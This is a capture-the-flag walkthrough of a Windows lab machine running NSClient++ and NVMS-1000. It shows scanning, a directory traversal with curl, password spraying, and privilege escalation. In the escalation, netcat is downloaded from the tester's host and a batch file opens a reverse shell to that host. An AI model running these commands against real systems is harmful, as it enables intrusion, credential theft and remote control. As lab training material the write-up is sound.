
Target : 10.129.227.77

Started off with the port scan : 21,22,80,135,139,445,5666,6063,6699,8443

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6063/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|     :Saturday
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.99%I=7%D=7/22%Time=6A60435F%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xe
SF:f\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\
SF:x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tra
SF:nsitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtm
SF:l\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<s
SF:cript\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20w
SF:indow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20
SF:</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOption
SF:s,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-
SF:Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb
SF:\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tr
SF:ansitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transiti
SF:onal\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\
SF:r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script
SF:\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window
SF:\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scr
SF:ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B4
SF:,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Lengt
SF:h:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<
SF:!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transit
SF:ional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\
SF:.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<h
SF:ead>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20t
SF:ype=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.loc
SF:ation\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\
SF:r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(X11Probe,6B,"HTTP/1\
SF:.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/html\r\nConten
SF:t-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.99%T=SSL%I=7%D=7/22%Time=6A60436A%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\0\
SF:x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\x18\x87\x01\x
SF:12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
SF:nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\
SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,
SF:36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x2
SF:0found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n
SF:\r\nDocument\x20not\x20found");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

**Enumerating Port : 21**

`ftp $ip`        (anonymous login allowed)

Found two user names - **Nadine** and **Nathan**

```
ftp> cd Nadine
ftp> get Confidential.txt
```

![](../Pasted%20image%2020260722100706.png)

```
ftp> cd Nathan
ftp> get "Notes to do.txt"
```

![](../Pasted%20image%2020260722100754.png)

**Enumerating Port : 445**

`crackmapexec smb $ip -u Guest -p ""`

![](../Pasted%20image%2020260722102046.png)

**Enumerating Port : 135**

`rpcclient -U "" $ip`

`impacket-samrdump $ip`

![](../Pasted%20image%2020260722102320.png)

`impacket-rpcdump $ip`

And haven't got any useful information

Enumerating Port : 80

Directory bruteforcing using gobuster: 

`gobuster dir -u "http://10.129.227.77" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 118`

And found the `NVMS-1000` login page, tried default credentials, but it's not working.

NVMS-1000 is vulnerable to Directory traversal Vulnerability : CVE-2019-20085

ref : https://www.exploit-db.com/exploits/47774

![](../Pasted%20image%2020260722104153.png)

We missed this parameter in curl : `--path-as-is` (curl removed all those slash, makesure to add it in directory traversals)

![](../Pasted%20image%2020260722105249.png)

`curl -X GET "http://10.129.227.77/../../../../../../../../../../../../windows/win.ini" -i --path-as-is`

![](../Pasted%20image%2020260722105348.png)

Let's do password spraying using `crackmapexec`, but it failed for `Nathan`, but successful for `Nadine`

![](../Pasted%20image%2020260722105718.png)

**Nadine : L1k3B1gBut7s@W0rk**

Let's check, if we have any writable share for `Nadine`, but unfortunately, we don't have any. I checked to connect via `impacket-psexec`, if we don't have any writable share, we can't do that.

```
crackmapexec smb $ip -u Nadine -p 'L1k3B1gBut7s@W0rk' --shares 

SMB         10.129.227.77   445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.227.77   445    SERVMON          [+] ServMon\Nadine:L1k3B1gBut7s@W0rk 
SMB         10.129.227.77   445    SERVMON          [+] Enumerated shares
SMB         10.129.227.77   445    SERVMON          Share           Permissions     Remark
SMB         10.129.227.77   445    SERVMON          -----           -----------     ------
SMB         10.129.227.77   445    SERVMON          ADMIN$                          Remote Admin
SMB         10.129.227.77   445    SERVMON          C$                              Default share
SMB         10.129.227.77   445    SERVMON          IPC$            READ            Remote IPC

```

Simply used `ssh` to connect as Nadine

```
nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
93fcc971ae4b2751636a799a23594c8d 
```

Privilege Escalation to Administrator:

NSClient++ 0.5.2.35 has Local Privilege Escalation Vulnerability : `CVE-2025-34078, CVE-2025-34079`

To confirm the version : nscp.exe --version

![](../Pasted%20image%2020260722150359.png)

Using this exploit : https://www.exploit-db.com/exploits/46802 (will try to elevate privilege)

But for that we need Administrator user password in NSClient++, tried password spraying for it using "Passwords.txt" we found earlier, but no luck. 

Let's check for configuration files. 

`C:\Program Files\NSClient++\nsclient.ini`

and retrieved this password : `ew2x6SsGTxjRwXOT`

Need to forward port `8443` to login

`ssh Nadine@$ip -L 8443:127.0.0.1:8443`

Need to enable permission to `CheckExternalScripts, Scheduler` once its done, need to create a scripts in external scripts, value should `C:\Temp\shell.bat`

Also, need to create a scheduler with the value of `C:\Temp\shell.bat`

In the target machine, 

```
cd C:\
mkdir Temp
cd Temp
curl http://10.10.16.241:8080/nc64.exe -o nc64.exe  (sharing netcat to get reverse shell connection)
```

`echo C:\Temp\nc64.exe -e cmd.exe 10.10.16.241 1234 > shell.bat`

And in the query tab in the web interface, run the schedule event and got the admin shell

![](../Pasted%20image%2020260722172504.png)

```
C:\Users\Administrator\Desktoptype root.txt
type root.txt
927b5330544e3312451d7decd3ee20b9
```

And got the administrator flag.

